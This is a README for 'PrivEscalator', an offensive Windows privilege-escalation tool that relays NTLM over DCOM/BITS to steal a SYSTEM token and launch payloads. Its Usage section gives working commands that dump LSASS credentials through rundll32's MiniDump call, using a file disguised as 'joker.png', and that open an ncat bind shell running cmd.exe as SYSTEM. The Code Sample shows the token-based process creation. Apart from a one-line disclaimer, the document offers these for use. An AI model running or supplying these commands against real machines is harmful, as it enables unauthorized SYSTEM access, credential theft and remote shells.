# PrivEscalator

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=flat-square)](http://makeapullrequest.com)

## Table of Contents
- [Overview](#overview)
- [Features](#features)
- [Project Structure](#project-structure)
- [Requirements](#requirements)
- [Installation](#installation)
- [Configuration](#configuration)
- [Usage](#usage)
- [Code Sample](#code-sample)
- [Technical Details](#technical-details)
- [License](#license)

## Overview
Windows privilege escalation helper inspired by the original PrivEscalator and RoguePotato research. It crafts NTLM relay chains over DCOM/BITS, steals a SYSTEM token exposed by vulnerable COM servers, and spawns arbitrary payloads using either `CreateProcessWithTokenW` or `CreateProcessAsUserW`. The repository contains the standalone console launcher plus the plumbing (DCOM storage trigger, NTLM negotiator, fake WinRM listener) necessary to reproduce the full attack path.

## Features
- **Automatic execution path selection** – Chooses between token duplication and primary-logon flows depending on available privileges.
- **BITS/WinRM fallback** – Detects modern Windows 10 builds that require the BITS CLSID with the fake WinRM listener bound to port 5985.
- **Custom CLSID, ports, and payloads** – Override every runtime parameter from the CLI without rebuilding.
- **In-process NTLM negotiation** – Implements the full Type1/Type2/Type3 handshake for both COM proxying and the WinRM HTTP listener.
- **Console-friendly output** – Pipes stdout/stderr of the launched payload back to the operator for immediate interaction or logging.
- **Extensible codebase** – Clear separation between negotiation (`LocalNegotiator`), DCOM bootstrap (`StorageTrigger` / `ObjRef`), and process creation logic, making it straightforward to plug in new transport methods.

## Project Structure
- `Program.cs` – Argument parsing, privilege checks, process creation, and console UX.
- `PotatoAPI.cs` – Orchestrates the DCOM trigger, NTLM negotiation, and exposes the duplicated token.
- `StorageTrigger.cs` / `Com/*` – Implements the COM storage interfaces required to coerce remote activation.
- `LocalNegotiator.cs` & `Security/*` – Handles SSPI calls, token extraction, and privilege enabling.
- `PrivEscalator.csproj` / `PrivEscalator.sln` – .NET Framework 4.8 project and solution files.

## Requirements
- Windows 10/11 with .NET Framework 4.8 SDK.
- Visual Studio 2022 (Desktop development with C# workload) or MSBuild 16+.
- Local administrator context is recommended to ensure the needed impersonation privileges (`SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`, `SeIncreaseQuotaPrivilege`).

## Installation
- Open the solution file (.sln).

- Select **Build Solution** from the **Build** menu.

The compiled binary will be placed in `PrivEscalator\bin\*\PrivEscalator.exe`.

## Configuration
All behavior is defined via command-line switches:

| Option | Description | Default |
| --- | --- | --- |
| `-c`, `--clsid` | CLSID of the COM server to coerce. For post-1809 systems this auto-switches to the BITS CLSID `4991D34B-80A1-4291-83B6-3328366B9097`. | `49...9097` |
| `-m`, `--method` | Execution strategy: `Auto`, `Token`, or `User`. `Auto` selects a viable method based on detected privileges. | `Auto` |
| `-p`, `--prog` | Full path to the process to spawn with elevated rights. | `C:\Windows\System32\cmd.exe` |
| `-a`, `--args` | Arguments passed to the elevated process. Use quotes when supplying complex commands. | `null` |
| `-l`, `--listenPort` | Local TCP port for the fake COM server when not emulating WinRM. | `6666` |
| `-h`, `--help` | Prints the option reference and exits. | n/a |

> **Tip:** When targeting modern Windows 10 builds, keep the default CLSID and ensure TCP 5985 is free so the fake WinRM listener can bind successfully.

## Usage
Spawn an elevated command shell via token duplication:
```powershell
PrivEscalator.exe -m Auto -p "C:\Windows\System32\cmd.exe"
```

Dump LSASS with a custom payload and arguments:
```powershell
PrivEscalator.exe `
  -m Token `
  -p "C:\Windows\System32\rundll32.exe" `
  -a "C:\Windows\Temp\joker.png,MiniDump 728 C:\Windows\Temp\joker.dmp full"
```

Force the legacy COM listener on a non-standard port:
```powershell
PrivEscalator.exe -m User -l 7777 -c "{03DEDE4B-2E7E-11D2-97C5-00C04F8EEB39}"
```

```
PrivEscalator.exe -p ncat.exe -a "-lvnp 443 -e cmd.exe"
```

## Code Sample

```30:49:Program.cs
PotatoAPI potato = new PotatoAPI(new Guid(clsId), port, requiresBits);
if (!potato.TriggerDCOM()) {
    Console.WriteLine("[!] Unable to capture a SYSTEM token.");
    return;
}

if (executionMethod == ExecutionMethod.Token) {
    CreateProcessWithTokenW(potato.Token, 0, program, finalArgs, flags, IntPtr.Zero, null, ref si, out pi);
} else {
    CreateProcessAsUserW(impersonatedPrimary, program, finalArgs, IntPtr.Zero, IntPtr.Zero, false, flags, IntPtr.Zero, @"C:\", ref si, out pi);
}
```

## Technical Details
- **Token capture** – `PotatoAPI` spins up either a COM relay port or a fake WinRM endpoint, intercepts NTLM messages, and replays them to `LocalNegotiator`.
- **DCOM coercion** – `StorageTrigger` implements `IStorage` to point the coerced COM activation back to `127.0.0.1:port`, enabling the loopback relay.
- **Privilege checks** – `Program.EnablePrivilege` ensures the process enables `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`, and `SeIncreaseQuotaPrivilege` before attempting process creation.
- **Process execution** – Depending on the selected method, `CreateProcessWithTokenW` (impersonation token) or `CreateProcessAsUserW` (primary token) launches the operator-specified payload with hidden window handles and inherited pipes for stdout/stderr streaming.

## Disclaimer
This tool is designed for educational and authorized security testing purposes only.

## License
This project is licensed under the [MIT License](LICENSE).
